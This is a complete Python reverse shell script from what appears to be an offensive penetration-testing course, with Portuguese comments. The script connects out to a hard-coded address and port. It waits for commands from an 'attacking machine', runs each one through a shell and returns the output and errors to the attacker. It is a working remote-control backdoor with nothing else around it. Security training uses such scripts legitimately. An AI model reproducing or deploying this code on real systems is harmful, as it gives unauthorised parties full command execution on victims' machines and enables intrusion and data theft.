# Python For Offensive PenTest: A Complete Practical Course - All rights reserved
# Follow me on LinkedIn https://jo.linkedin.com/in/python2


# Basic TCP Client
import socket
import subprocess
# Inicia um shell no sistema

def connect():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # cria um socket de conexao
    s.connect(('10.144.31.54', 9595)) # Conecta no endereco ip do servidor na 9595

    while True: # recebe comandos da maquina atacante
        command = s.recv(1024).decode('utf-8') # le os primeiros kb do socket TCP
        if 'terminate' in command: # termina o loop se receber o comando terminate
            s.close()
            break
        else: # caso contrario, passa o comando para o processo shell
            CMD = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            s.send(CMD.stdout.read()) # retorna o resultado
            s.send(CMD.stderr.read()) # envia o erro caso o comando gere

def main ():
    connect()

main()